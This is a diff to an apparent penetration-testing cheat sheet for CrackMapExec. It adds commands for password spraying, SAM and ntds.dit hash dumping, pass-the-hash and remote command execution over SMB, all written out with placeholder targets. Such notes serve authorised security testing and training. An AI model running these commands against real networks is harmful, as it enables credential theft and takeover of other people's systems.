@@ -39,18 +39,24 @@ Main syntax
 crackmapexec <protocol> <target-IP> -u <user or userlist> -p <password or passwordlist>
 ```
 
+
 ```bash
 # Check if we can access a machine
 crackmapexec smb $ip --local-auth -u <username> -p <password> -d <DOMAIN>
 
+# Spraying password technique
+crackmapexec smb $ip -u /folder/userlist.txt -p '<password>' --local-auth --continue-on-success
+# --continue-on-success:  continue spraying even after a valid password is found. Useful for spraying a single password against a large user list
+# --local-auth:  if we are targetting a non-domain joined computer, we will need to use the option --local-auth.
+
 # Check which machines we can access in a subnet
 crackmapexec smb $ip/24 -u <username> -p <password> -d <DOMAIN>
 
-# Get sam: all users authenticated in the machine and their hashes
-crackmapexec smb $ip --local-auth -u <username> -p <password> -d <DOMAIN> --sam
+# Get sam: extract hashes from all users authenticated in the machine 
+crackmapexec smb $ip -u <username> -p <password> -d <DOMAIN> --sam
 
 # Get the ntds.dit, given that your user has permissions
-crackmapexec smb $ip --local-auth -u <username> -p <password> -d <DOMAIN> --ntds
+crackmapexec smb $ip -u <username> -p <password> -d <DOMAIN> --ntds
 
 # See shares
 crackmapexec smb $ip --local-auth -u <username> -p <password> -d <DOMAIN> --shares
@@ -64,12 +70,22 @@ crackmapexec smb $ip --local-auth -u <username> -p <password> -d <DOMAIN> --user
 # Enumerate logged on users
 crackmapexec smb $ip --local-auth -u <username> -p <password> -d <DOMAIN> --loggedon-users
 
-# Using a hash instead of a password, to authenticate ourselves
+# Using a hash instead of a password, to authenticate ourselves: Pass the hash attack (PtH)
 crackmapexec smb $ip -u <username> -H <hash> -d <DOMAIN>
 
 # Execute commands with flag -x
 crackmapexec smb $ip/24 -u <Administrator> -d . -H <hash> -x whoami
 ```
+
+
+
+### RCE with crackmapexec:
+
+```bash
+#  If the--exec-method is not defined, CrackMapExec will try to execute the atexec method, if it fails you can try to specify the --exec-method smbexec.
+crackmapexec smb $ip -u Administrator -p '<password>' -x 'whoami' --exec-method smbexec
+```
+
 
 ## Basic technique
 
